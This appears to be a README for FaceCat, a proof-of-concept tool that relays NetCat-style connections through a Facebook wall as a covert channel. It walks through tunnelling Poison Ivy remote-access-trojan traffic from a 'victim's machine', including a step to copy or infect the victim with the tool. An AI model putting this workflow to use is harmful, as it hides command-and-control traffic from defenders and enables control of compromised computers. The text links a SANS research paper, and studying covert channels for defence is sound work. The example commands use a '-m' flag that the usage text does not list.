FaceCat is cover channel Proof of Concept in Facebook. It is not actively maintained, so please not that it may require some HTML parsing changes. Any pull request with an update is more than welcome.
It works similar to the widely known tool NetCat, but 

```
 $ ./facecat.py
Usage: facecat.py [options]
Options:
-h, --help            show this help message and exit wall pipe account
-w WALL, --wall=WALL  wall pipe account 
-c HOST --host=HOST   connection host
-p PORT --port=PORT   listening or connection port
-v --verbose          verbose output
```

* Help: Just show the help

* Wall: Email of the master’s wall. It has to be previously configured in order to allow writing on it.

* Host: FaceCat can work by listening or connecting, as NetCat does. If you chose a host, connection mode is used. If not, listening mode is.

* Port: Port where FaceCat is listening for new connections, or port to connect to (Host:Port connection).

* Verbose: Shows each step of the process. Useful for educational purposes.

Example using Poison Ivy:
1. Create a Poison Ivy server that will try to connect to 127.0.0.1 at port 3460. We also start a Poison Ivy client listening at the same port.
2. Create and configure a FaceBook account in order to write on its wall, for instance `wall1@gmail.com`.
3. Run Internet Explorer and login in our newly created account.
4. Run FaceCat in order to read wall1@gmail.com’s wall and to relay to our local poison ivy’s client: 
```
$ facecat.py –v –m wall1@gmail.com –c 127.0.0.1 –p 3460
```
5. Copy (or infect) FaceCat and Poison Ivy’s server to the victim’s machine.
6. Run FaceCat in order to listen to port 3460 in the victim’s machine and to relay to `wall1@gmail.com`’s wall:
```
$ facecat.py –v –m wall1@gmail.com –p 3460
```
7. Run Poison Ivy’s client in the victim’s machine.
8. Use Poison Ivy normally, but through a FaceBook’s Covert Channel.

Demo: https://youtu.be/C_c8KNvVSVg

Full SANS Paper: https://www.sans.org/reading-room/whitepapers/engineering/covert-channels-social-networks-33960 
